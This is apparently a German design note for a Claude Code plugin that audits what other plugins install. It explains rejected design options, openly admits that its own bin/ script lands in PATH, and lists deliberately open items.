| **Hook, der bei jeder Installation automatisch prüft** | Er liefe ungefragt, also genau die Eigenschaft, die dieses Werkzeug bei anderen sichtbar macht. |
| **Skill statt Befehl** | Ein Skill kann vom Modell gezogen werden. Wer „läuft nur auf bewussten Aufruf" zusagt, muss einen Befehl nehmen. |
| **Subagent für den Bericht** | War im Entwurf eingeplant, als der Bericht noch interpretiert werden sollte. Sobald das Skript ihn fertig liefert, gibt es nichts zu interpretieren. |
| **GitHub-URL selbst klonen** | Ein Prüfwerkzeug, das ungefragt fremden Code herunterlädt, arbeitet gegen seinen Zweck. |

Nebenbei kein MCP-Server, weil nichts nach draußen geht.

## Der ehrliche Punkt

`bin/` legt eine ausführbare Datei in den PATH des Bash-Tools, solange das Plugin aktiv
ist. Das ist einer der Punkte, die dieses Werkzeug bei anderen meldet — es taucht in
seinem eigenen Bericht auf.

Und die Gegenprobe gehört dazu: Die Begründung gegen den Hook lautet „nichts läuft
ungefragt". Das `bin/`-Skript liegt aber genau deshalb im PATH, weil das Plugin aktiv ist,
nicht weil man es aufruft. Der Unterschied ist, dass es dort nur liegt und nichts tut.
Das gehört in den Bericht und nicht in eine Fußnote.

Es gibt keine saubere und keine schmutzige Seite. Jedes Plugin legt etwas in dein System.
Die Frage ist nur, ob du weißt, was.

## Offen (bewusst)

- Markdown-Ausgabe. Erst bauen, wenn ein echter Bedarf auftaucht.
- Wort-Diff für geänderte Kommandos. Heute stehen vorher und nachher beide da, den
  Unterschied muss man selbst sehen.
- Rückwirkender Vergleich gegen die Altversionen im Cache. Claude Code räumt sie nicht
  auf, es läge also eine Aussage darin, ohne dass vorher ein Stand aufgenommen wurde.
